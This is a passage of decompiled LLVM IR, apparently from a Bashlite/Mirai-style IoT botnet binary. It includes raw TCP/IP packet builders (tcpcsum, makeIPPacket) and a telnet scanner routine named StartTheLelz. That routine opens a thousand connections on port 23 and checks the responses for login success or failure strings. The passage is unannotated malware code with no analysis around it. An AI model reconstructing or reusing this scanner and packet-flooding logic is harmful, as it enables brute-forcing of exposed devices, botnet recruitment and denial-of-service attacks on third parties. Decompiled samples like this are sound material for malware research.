  uselistorder i32 %v4_804c4c920, { 2, 1, 0 }
  uselistorder i32 %v4_804c49c, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804c471.lcssa, { 1, 0 }
  uselistorder i32 %v4_804c47f, { 1, 0 }
  uselistorder i32 %v6_804c471, { 1, 2, 0 }
  uselistorder i32 %v4_804c471, { 1, 0 }
  uselistorder i32 %v6_804c462, { 1, 0 }
  uselistorder label %dec_label_pc_804c4a4, { 1, 0 }
  uselistorder label %dec_label_pc_804c45f, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_804c502 = add i32 %tmp9, 12
  %v2_804c502 = inttoptr i32 %v1_804c502 to i32*
  %v3_804c502 = load i32, i32* %v2_804c502, align 4
  %v1_804c50b = add i32 %tmp9, 16
  %v2_804c50b = inttoptr i32 %v1_804c50b to i32*
  %v3_804c50b = load i32, i32* %v2_804c50b, align 4
  %v1_804c51e = call i32 @htons(i32 20)
  %v1_804c538 = call i32 @malloc(i32 32)
  store i32 %v1_804c538, i32* %ecx.global-to-local, align 4
  %v2_804c54b = inttoptr i32 %v1_804c538 to i32*
  store i32 %v3_804c502, i32* %v2_804c54b, align 4
  %v1_804c550 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c550 = add i32 %v1_804c550, 4
  %v3_804c550 = inttoptr i32 %v2_804c550 to i32*
  store i32 %v3_804c50b, i32* %v3_804c550, align 4
  %v1_804c556 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c556 = add i32 %v1_804c556, 8
  %v3_804c556 = inttoptr i32 %v2_804c556 to i32*
  store i32 0, i32* %v3_804c556, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_804c55f = add i32 %v1_804c538, 12
  store i32 %v1_804c55f, i32* %edx.global-to-local, align 4
  %v1_804c562 = inttoptr i32 %tmp1 to i32*
  %v2_804c562 = load i32, i32* %v1_804c562, align 4
  %v2_804c564 = inttoptr i32 %v1_804c55f to i32*
  store i32 %v2_804c562, i32* %v2_804c564, align 4
  %v0_804c566 = load i32, i32* @ecx, align 4
  %v1_804c566 = add i32 %v0_804c566, 4
  %v2_804c566 = inttoptr i32 %v1_804c566 to i32*
  %v3_804c566 = load i32, i32* %v2_804c566, align 4
  %v1_804c569 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c569 = add i32 %v1_804c569, 4
  %v3_804c569 = inttoptr i32 %v2_804c569 to i32*
  store i32 %v3_804c566, i32* %v3_804c569, align 4
  %v0_804c56c = load i32, i32* @ecx, align 4
  %v1_804c56c = add i32 %v0_804c56c, 8
  %v2_804c56c = inttoptr i32 %v1_804c56c to i32*
  %v3_804c56c = load i32, i32* %v2_804c56c, align 4
  %v1_804c56f = load i32, i32* %edx.global-to-local, align 4
  %v2_804c56f = add i32 %v1_804c56f, 8
  %v3_804c56f = inttoptr i32 %v2_804c56f to i32*
  store i32 %v3_804c56c, i32* %v3_804c56f, align 4
  %v0_804c572 = load i32, i32* @ecx, align 4
  %v1_804c572 = add i32 %v0_804c572, 12
  %v2_804c572 = inttoptr i32 %v1_804c572 to i32*
  %v3_804c572 = load i32, i32* %v2_804c572, align 4
  %v1_804c575 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c575 = add i32 %v1_804c575, 12
  %v3_804c575 = inttoptr i32 %v2_804c575 to i32*
  store i32 %v3_804c572, i32* %v3_804c575, align 4
  %v0_804c578 = load i32, i32* @ecx, align 4
  %v1_804c578 = add i32 %v0_804c578, 16
  %v2_804c578 = inttoptr i32 %v1_804c578 to i32*
  %v3_804c578 = load i32, i32* %v2_804c578, align 4
  %v1_804c57b = load i32, i32* %edx.global-to-local, align 4
  %v2_804c57b = add i32 %v1_804c57b, 16
  %v3_804c57b = inttoptr i32 %v2_804c57b to i32*
  store i32 %v3_804c578, i32* %v3_804c57b, align 4
  %v2_804c584 = inttoptr i32 %v1_804c538 to i16*
  %v3_804c584 = call i32 @csum(i16* %v2_804c584, i32 32)
  %v1_804c596 = call i32 @free(i32 %v1_804c538)
  %v4_804c59e = urem i32 %v3_804c584, 65536
  ret i32 %v4_804c59e

; uselistorder directives
  uselistorder i32 %v1_804c538, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804c5a9 = load i32, i32* @ebp, align 4
  store i32 %v0_804c5a9, i32* %stack_var_-4, align 4
  %v4_804c5af = sext i8 %tmp8 to i32
  %v4_804c5b5 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804c5d2 = add i32 %v4_804c5b5, 1
  %v2_804c5d2 = inttoptr i32 %v1_804c5d2 to i8*
  store i8 0, i8* %v2_804c5d2, align 1
  %v1_804c5d9 = add i32 %tmp5, 20
  %v1_804c5df = trunc i32 %v1_804c5d9 to i16
  %v3_804c5df = add i32 %v4_804c5b5, 2
  %v4_804c5df = inttoptr i32 %v3_804c5df to i16*
  store i16 %v1_804c5df, i16* %v4_804c5df, align 2
  %v2_804c5e3 = call i32 @rand_cmwc(i32 %v4_804c5af)
  %v1_804c5ed = trunc i32 %v2_804c5e3 to i16
  %v3_804c5ed = add i32 %v4_804c5b5, 4
  %v4_804c5ed = inttoptr i32 %v3_804c5ed to i16*
  store i16 %v1_804c5ed, i16* %v4_804c5ed, align 2
  %v1_804c5f4 = add i32 %v4_804c5b5, 6
  %v2_804c5f4 = inttoptr i32 %v1_804c5f4 to i16*
  store i16 0, i16* %v2_804c5f4, align 2
  %v1_804c5fd = add i32 %v4_804c5b5, 8
  %v2_804c5fd = inttoptr i32 %v1_804c5fd to i8*
  store i8 -1, i8* %v2_804c5fd, align 1
  %v3_804c607 = add i32 %v4_804c5b5, 9
  %v4_804c607 = inttoptr i32 %v3_804c607 to i8*
  store i8 %tmp8, i8* %v4_804c607, align 1
  %v1_804c60d = add i32 %v4_804c5b5, 10
  %v2_804c60d = inttoptr i32 %v1_804c60d to i16*
  store i16 0, i16* %v2_804c60d, align 2
  %v2_804c619 = add i32 %v4_804c5b5, 12
  %v3_804c619 = inttoptr i32 %v2_804c619 to i32*
  %v2_804c622 = add i32 %v4_804c5b5, 16
  %v3_804c622 = inttoptr i32 %v2_804c622 to i32*
  store i32 %tmp, i32* %v3_804c622, align 4
  %v2_804c625 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c625, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 2, 0, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804c627 = load i32, i32* @ebp, align 4
  store i32 %v0_804c627, i32* %stack_var_-4, align 4
  %v4_804c62d = add i32 %arg1, -2
  %v9_804c62d = sub i32 1, %arg1
  %v10_804c62d = and i32 %v9_804c62d, %arg1
  %v11_804c62d = icmp slt i32 %v10_804c62d, 0
  %v12_804c62d = icmp eq i32 %v4_804c62d, 0
  %v13_804c62d = icmp slt i32 %v4_804c62d, 0
  %v3_804c631 = icmp eq i1 %v13_804c62d, %v11_804c62d
  %v4_804c631 = icmp eq i1 %v12_804c62d, false
  %v5_804c631 = and i1 %v4_804c631, %v3_804c631
  br i1 %v5_804c631, label %dec_label_pc_804c63c, label %dec_label_pc_804c651

dec_label_pc_804c63c:                             ; preds = %entry
  %v1_804c642 = call i32 @__libc_close(i32 %arg1)
  %v2_804c654.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804c651

dec_label_pc_804c651:                             ; preds = %entry, %dec_label_pc_804c63c
  %v2_804c654 = phi i32 [ %v2_804c654.pre, %dec_label_pc_804c63c ], [ %v0_804c627, %entry ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804c63c ], [ 1, %entry ]
  store i32 %v2_804c654, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804c62d, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c651, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_804c65f = add i32 %tmp1, 4
  %v2_804c65f = inttoptr i32 %v1_804c65f to i32*
  %v3_804c65f = load i32, i32* %v2_804c65f, align 4
  %v1_804c66b = call i32 @__GI_inet_ntoa(i32 %v3_804c65f)
  ret i32 %v1_804c66b
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804c678 = load i32, i32* @edi, align 4
  store i32 %v0_804c678, i32* %stack_var_-8, align 4
  %v1_804c682 = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_804c687 = and i32 %tmp4, -256
  %v5_804c689 = call i8* @_memset(i8* %v1_804c682, i32 %v1_804c687, i32 %tmp5)
  %v4_804c697 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_804c6ab = inttoptr i32 %tmp to i32*
  %v3_804c6ab = call i32 @contains_string(i32 %tmp4, i32* %v2_804c6ab)
  %v1_804c6b3 = icmp ne i32 %v3_804c6ab, 0
  %storemerge = zext i1 %v1_804c6b3 to i32
  %v3_804c6ca = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804c6ca, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804c6f6 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_804c6fd = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_804c70a = udiv i32 %arg1, 32
  %v1_804c710 = urem i32 %arg1, 32
  %v0_804c713 = load i32, i32* @ebp, align 4
  %v2_804c713 = mul nuw nsw i32 %v2_804c70a, 4
  %v3_804c713 = add nsw i32 %v2_804c713, -140
  %v4_804c713 = add i32 %v3_804c713, %v0_804c713
  %v5_804c713 = inttoptr i32 %v4_804c713 to i32*
  %v6_804c713 = load i32, i32* %v5_804c713, align 4
  %v9_804c713 = shl i32 1, %v1_804c710
  %v12_804c713 = or i32 %v6_804c713, %v9_804c713
  store i32 %v12_804c713, i32* %v5_804c713, align 4
  %v1_804c71e = add i32 %arg1, 1
  %v2_804c722 = ptrtoint i32* %stack_var_-152 to i32
  %v5_804c735 = call i32 @__libc_select(i32 %v1_804c71e, i32 %v2_804c6f6, i32 0, i32 0, i32 %v2_804c722)
  %tmp22 = icmp slt i32 %v5_804c735, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_804c74d, label %dec_label_pc_804c767

dec_label_pc_804c74d:                             ; preds = %entry
  %v4_804c759 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_804c767

dec_label_pc_804c767:                             ; preds = %entry, %dec_label_pc_804c74d
  %storemerge = phi i32 [ %v4_804c759, %dec_label_pc_804c74d ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c767, { 1, 0 }
}

define i32 @contains_success() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v4_804c783 = call i32 @contains_string(i32 %tmp, i32* bitcast ([4 x i8*]* @global_var_805f540.237 to i32*))
  ret i32 %v4_804c783
}

define i32 @contains_fail() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v4_804c79e = call i32 @contains_string(i32 %tmp, i32* bitcast ([7 x i8*]* @global_var_805f520.245 to i32*))
  ret i32 %v4_804c79e
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804c7a8 = load i32, i32* @ebp, align 4
  store i32 %v0_804c7a8, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804c7c3

dec_label_pc_804c7c3:                             ; preds = %dec_label_pc_804c7c3, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804c7c3, %dec_label_pc_804c7c3 ]
  %v4_804c7c3 = add i32 %stack_var_-12.0, 1
  %v2_804c7c9 = mul i32 %v4_804c7c3, 4
  %v5_804c7cc = add i32 %v2_804c7c9, %tmp5
  %v1_804c7cf = inttoptr i32 %v5_804c7cc to i32*
  %v2_804c7cf = load i32, i32* %v1_804c7cf, align 4
  %v1_804c7d1 = icmp eq i32 %v2_804c7cf, 0
  %v1_804c7d3 = icmp eq i1 %v1_804c7d1, false
  br i1 %v1_804c7d3, label %dec_label_pc_804c7c3, label %dec_label_pc_804c808.preheader

dec_label_pc_804c808.preheader:                   ; preds = %dec_label_pc_804c7c3
  %v2_804c7f0 = inttoptr i32 %arg1 to i8*
  %v5_804c80e16 = icmp sgt i32 %v4_804c7c3, 0
  br i1 %v5_804c80e16, label %dec_label_pc_804c7de.lr.ph, label %dec_label_pc_804c817

dec_label_pc_804c7de.lr.ph:                       ; preds = %dec_label_pc_804c808.preheader
  br label %dec_label_pc_804c7de

dec_label_pc_804c7de:                             ; preds = %dec_label_pc_804c7de.lr.ph, %dec_label_pc_804c805
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804c7de.lr.ph ], [ %v4_804c805, %dec_label_pc_804c805 ]
  %v2_804c7e1 = mul i32 %storemerge117, 4
  %v5_804c7e4 = add i32 %v2_804c7e1, %tmp5
  %v1_804c7e7 = inttoptr i32 %v5_804c7e4 to i32*
  %v2_804c7e7 = load i32, i32* %v1_804c7e7, align 4
  store i32 %v2_804c7e7, i32* @eax, align 4
  %v3_804c7f0 = call i32 @strcasestr(i8* %v2_804c7f0, i32 %v2_804c7e7)
  %v1_804c7f8 = icmp eq i32 %v3_804c7f0, 0
  br i1 %v1_804c7f8, label %dec_label_pc_804c805, label %dec_label_pc_804c817

dec_label_pc_804c805:                             ; preds = %dec_label_pc_804c7de
  %v4_804c805 = add nuw nsw i32 %storemerge117, 1
  %v5_804c80e = icmp slt i32 %v4_804c805, %v4_804c7c3
  br i1 %v5_804c80e, label %dec_label_pc_804c7de, label %dec_label_pc_804c817

dec_label_pc_804c817:                             ; preds = %dec_label_pc_804c7de, %dec_label_pc_804c805, %dec_label_pc_804c808.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_804c808.preheader ], [ 0, %dec_label_pc_804c805 ], [ 1, %dec_label_pc_804c7de ]
  %v2_804c81a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c81a, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_804c7c3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c817, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c7de, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_804c822 = ptrtoint i32* %stack_var_-636 to i32
  store i32 1000, i32* %eax.global-to-local, align 4
  %v2_804c841 = call i32 @__GI_time(i32* null)
  store i32 %v2_804c841, i32* %eax.global-to-local, align 4
  store i32 %v2_804c841, i32* @ebx, align 4
  %v1_804c84b = call i32 @rand_cmwc(i32 0)
  %v1_804c850 = load i32, i32* @ebx, align 4
  %v2_804c850 = xor i32 %v1_804c850, %v1_804c84b
  store i32 %v2_804c850, i32* @eax, align 4
  %v1_804c856 = call i32 @srand(i32 %v2_804c850)
  store i32 %v1_804c856, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-608, align 4
  %v1_804c86c = call i32 @htons(i32 23)
  %v15_804c881 = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v15_804c881, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-600, align 4
  %v1_804c899 = call i32 @malloc(i32 1025)
  store i32 %v1_804c899, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804c8b5 = inttoptr i32 %v1_804c899 to i8*
  %v4_804c8b5 = call i32 @__GI_memset(i8* %v3_804c8b5, i32 0, i32 1025)
  %v1_804c8ea = add i32 %v15_804c822, -28001
  %v2_804c8ed = and i32 %v1_804c8ea, -16
  store i32 5000, i32* %edx.global-to-local, align 4
  %v1_804c910 = inttoptr i32 %v2_804c8ed to i8*
  store i32 %v2_804c8ed, i32* @edi, align 4
  %v1_804c915 = and i32 %v1_804c8ea, -256
  store i32 %v1_804c915, i32* %eax.global-to-local, align 4
  %v5_804c917 = call i8* @_memset(i8* %v1_804c910, i32 %v1_804c915, i32 5000)
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804c976 = or i32 %v2_804c8ed, 9
  br label %dec_label_pc_804c922

dec_label_pc_804c922:                             ; preds = %entry, %dec_label_pc_804c922
  %storemerge245 = phi i32 [ 0, %entry ], [ %v4_804c99b, %dec_label_pc_804c922 ]
  %v2_804c936 = mul nuw nsw i32 %storemerge245, 28
  %v2_804c938 = add i32 %v2_804c936, %v2_804c8ed
  store i32 %v2_804c938, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804c940 = inttoptr i32 %v2_804c938 to i32*
  store i32 0, i32* %v2_804c940, align 4
  %v0_804c942 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c942 = add i32 %v0_804c942, 4
  store i32 %v1_804c942, i32* %eax.global-to-local, align 4
  %v0_804c945 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c945 = inttoptr i32 %v1_804c942 to i32*
  store i32 %v0_804c945, i32* %v2_804c945, align 4
  %v0_804c947 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c947 = add i32 %v0_804c947, 4
  store i32 %v1_804c947, i32* %eax.global-to-local, align 4
  %v0_804c94a = load i32, i32* %edx.global-to-local, align 4
  %v2_804c94a = inttoptr i32 %v1_804c947 to i32*
  store i32 %v0_804c94a, i32* %v2_804c94a, align 4
  %v0_804c94c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c94c = add i32 %v0_804c94c, 4
  store i32 %v1_804c94c, i32* %eax.global-to-local, align 4
  %v0_804c94f = load i32, i32* %edx.global-to-local, align 4
  %v2_804c94f = inttoptr i32 %v1_804c94c to i32*
  store i32 %v0_804c94f, i32* %v2_804c94f, align 4
  %v0_804c951 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c951 = add i32 %v0_804c951, 4
  store i32 %v1_804c951, i32* %eax.global-to-local, align 4
  %v0_804c954 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c954 = inttoptr i32 %v1_804c951 to i32*
  store i32 %v0_804c954, i32* %v2_804c954, align 4
  %v0_804c956 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c956 = add i32 %v0_804c956, 4
  store i32 %v1_804c956, i32* %eax.global-to-local, align 4
  %v0_804c959 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c959 = inttoptr i32 %v1_804c956 to i32*
  store i32 %v0_804c959, i32* %v2_804c959, align 4
  %v0_804c95b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c95b = add i32 %v0_804c95b, 4
  %v0_804c95e = load i32, i32* %edx.global-to-local, align 4
  %v2_804c95e = inttoptr i32 %v1_804c95b to i32*
  store i32 %v0_804c95e, i32* %v2_804c95e, align 4
  %v3_804c976 = add i32 %v2_804c976, %v2_804c936
  %v4_804c976 = inttoptr i32 %v3_804c976 to i8*
  store i8 1, i8* %v4_804c976, align 1
  %v1_804c993 = add i32 %v2_804c938, 24
  store i32 %v1_804c993, i32* %edx.global-to-local, align 4
  %v2_804c999 = inttoptr i32 %v1_804c993 to i32*
  store i32 %v1_804c899, i32* %v2_804c999, align 4
  %v4_804c99b = add nuw nsw i32 %storemerge245, 1
  store i32 %v4_804c99b, i32* %eax.global-to-local, align 4
  %v15_804c9a1 = icmp eq i32 %v4_804c99b, 1000
  br i1 %v15_804c9a1, label %dec_label_pc_804c9aa.preheader, label %dec_label_pc_804c922

dec_label_pc_804c9aa.preheader:                   ; preds = %dec_label_pc_804c922
  %v2_804c87b = ptrtoint i32* %stack_var_-608 to i32
  %v2_804cdf0 = ptrtoint i32* %stack_var_-320 to i32
  %tmp38 = bitcast i32* %stack_var_-320 to i8*
  %v2_804ce73 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804cecb = ptrtoint i32* %stack_var_-332 to i32
  %v2_804ced2 = ptrtoint i32* %stack_var_-336 to i32
  %v2_804ca1b = or i32 %v2_804c8ed, 8
  %v2_804cb4d = or i32 %v2_804c8ed, 11
  %v2_804cb87 = or i32 %v2_804c8ed, 10
  %v2_804d6d3 = add i32 %v2_804c8ed, 16
  br label %dec_label_pc_804c9aa

dec_label_pc_804c9aa:                             ; preds = %dec_label_pc_804dadc, %dec_label_pc_804c9aa.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804c9aa.preheader ], [ %stack_var_-624.1, %dec_label_pc_804dadc ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804c9aa.preheader ], [ %stack_var_-620.1, %dec_label_pc_804dadc ]
  br label %dec_label_pc_804c9b6

dec_label_pc_804c9b6:                             ; preds = %dec_label_pc_804c9aa, %dec_label_pc_804dadc
  %storemerge = phi i32 [ 0, %dec_label_pc_804c9aa ], [ %v4_804dadc, %dec_label_pc_804dadc ]
  %storemerge43 = phi i32 [ 0, %dec_label_pc_804c9aa ], [ %v4_804dadc, %dec_label_pc_804dadc ]
  %stack_var_-620.242 = phi i32 [ %stack_var_-620.0, %dec_label_pc_804c9aa ], [ %stack_var_-620.1, %dec_label_pc_804dadc ]
  %stack_var_-624.241 = phi i32 [ %stack_var_-624.0, %dec_label_pc_804c9aa ], [ %stack_var_-624.1, %dec_label_pc_804dadc ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804c9bc = mul nuw nsw i32 %storemerge43, 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  %v2_804c9ca = mul nuw nsw i32 %storemerge43, 28
  %v2_804c9cc = add i32 %v2_804c9ca, %v2_804c8ed
  %v1_804c9ce = add i32 %v2_804c9cc, 16
  store i32 %v1_804c9ce, i32* %eax.global-to-local, align 4
  %v1_804c9d1 = inttoptr i32 %v1_804c9ce to i32*
  %v2_804c9d1 = load i32, i32* %v1_804c9d1, align 4
  store i32 %v2_804c9d1, i32* %eax.global-to-local, align 4
  %v1_804c9d3 = icmp eq i32 %v2_804c9d1, 0
  %v1_804c9d5 = icmp eq i1 %v1_804c9d3, false
  br i1 %v1_804c9d5, label %dec_label_pc_804ca05, label %dec_label_pc_804c9d7

dec_label_pc_804c9d7:                             ; preds = %dec_label_pc_804c9b6
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804c9da = load i32, i32* @esp, align 4
  %v1_804c9dd = add i32 %v0_804c9da, -16
  %v2_804c9dd = inttoptr i32 %v1_804c9dd to i32*
  store i32 0, i32* %v2_804c9dd, align 4
  %v1_804c9df = inttoptr i32 %storemerge43 to i32*
  %v2_804c9df = call i32 @__GI_time(i32* %v1_804c9df)
  store i32 %v2_804c9df, i32* @esi, align 4
  %v0_804c9ec = load i32, i32* @ebx, align 4
  %v1_804c9ee = mul i32 %v0_804c9ec, 4
  store i32 %v1_804c9ee, i32* %edx.global-to-local, align 4
  %v2_804c9fc = mul i32 %v0_804c9ec, 28
  %v2_804c9fe = add i32 %v2_804c9fc, %v2_804c8ed
  %v1_804ca00 = add i32 %v2_804c9fe, 16
  store i32 %v1_804ca00, i32* %eax.global-to-local, align 4
  %v2_804ca03 = inttoptr i32 %v1_804ca00 to i32*
  store i32 %v2_804c9df, i32* %v2_804ca03, align 4
  br label %dec_label_pc_804ca05

dec_label_pc_804ca05:                             ; preds = %dec_label_pc_804c9b6, %dec_label_pc_804c9d7
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804ca1b = add i32 %v2_804ca1b, %v2_804c9ca
  %v4_804ca1b = inttoptr i32 %v3_804ca1b to i8*
  %v5_804ca1b = load i8, i8* %v4_804ca1b, align 4
  %v6_804ca1b = zext i8 %v5_804ca1b to i32
  %v8_804ca1b = and i32 %v2_804c9ca, -256
  %v9_804ca1b = or i32 %v6_804ca1b, %v8_804ca1b
  store i32 %v9_804ca1b, i32* %eax.global-to-local, align 4
  store i32 %v6_804ca1b, i32* %edx.global-to-local, align 4
  store i32 %v6_804ca1b, i32* @edi, align 4
  %v1_804ca3f = mul nuw nsw i32 %v6_804ca1b, 4
  %v2_804ca3f = add nuw nsw i32 %v1_804ca3f, 134582856
  %v3_804ca3f = inttoptr i32 %v2_804ca3f to i32*
  %v4_804ca3f = load i32, i32* %v3_804ca3f, align 4
  store i32 %v4_804ca3f, i32* %eax.global-to-local, align 4
  switch i8 %v5_804ca1b, label %dec_label_pc_804dadc [
    i8 0, label %dec_label_pc_804ca48
    i8 1, label %dec_label_pc_804cde6
    i8 2, label %dec_label_pc_804d136
    i8 3, label %dec_label_pc_804d267
    i8 4, label %dec_label_pc_804d3c5
    i8 5, label %dec_label_pc_804d4f6
    i8 6, label %dec_label_pc_804d654
    i8 7, label %dec_label_pc_804d977
  ]

dec_label_pc_804ca48:                             ; preds = %dec_label_pc_804ca05
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804ca5e = add i32 %v2_804c976, %v2_804c9ca
  %v4_804ca5e = inttoptr i32 %v3_804ca5e to i8*
  %v5_804ca5e = load i8, i8* %v4_804ca5e, align 1
  %v10_804ca62 = icmp eq i8 %v5_804ca5e, 1
  %v1_804ca64 = icmp eq i1 %v10_804ca62, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804ca64, label %dec_label_pc_804cb13, label %dec_label_pc_804ca6a

dec_label_pc_804ca6a:                             ; preds = %dec_label_pc_804ca48
  %v1_804ca82 = add i32 %v2_804c9cc, 24
  store i32 %v1_804ca82, i32* %eax.global-to-local, align 4
  %v1_804ca85 = inttoptr i32 %v1_804ca82 to i32*
  %v2_804ca85 = load i32, i32* %v1_804ca85, align 4
  store i32 %v2_804c9cc, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804caa8 = inttoptr i32 %v2_804c9cc to i32*
  store i32 0, i32* %v2_804caa8, align 4
  %v0_804caaa = load i32, i32* %eax.global-to-local, align 4
  %v1_804caaa = add i32 %v0_804caaa, 4
  store i32 %v1_804caaa, i32* %eax.global-to-local, align 4
  %v0_804caad = load i32, i32* %edx.global-to-local, align 4
  %v2_804caad = inttoptr i32 %v1_804caaa to i32*
  store i32 %v0_804caad, i32* %v2_804caad, align 4
  %v0_804caaf = load i32, i32* %eax.global-to-local, align 4
  %v1_804caaf = add i32 %v0_804caaf, 4
  store i32 %v1_804caaf, i32* %eax.global-to-local, align 4
  %v0_804cab2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cab2 = inttoptr i32 %v1_804caaf to i32*
  store i32 %v0_804cab2, i32* %v2_804cab2, align 4
  %v0_804cab4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cab4 = add i32 %v0_804cab4, 4
  store i32 %v1_804cab4, i32* %eax.global-to-local, align 4
  %v0_804cab7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cab7 = inttoptr i32 %v1_804cab4 to i32*
  store i32 %v0_804cab7, i32* %v2_804cab7, align 4
  %v0_804cab9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cab9 = add i32 %v0_804cab9, 4
  store i32 %v1_804cab9, i32* %eax.global-to-local, align 4
  %v0_804cabc = load i32, i32* %edx.global-to-local, align 4
  %v2_804cabc = inttoptr i32 %v1_804cab9 to i32*
  store i32 %v0_804cabc, i32* %v2_804cabc, align 4
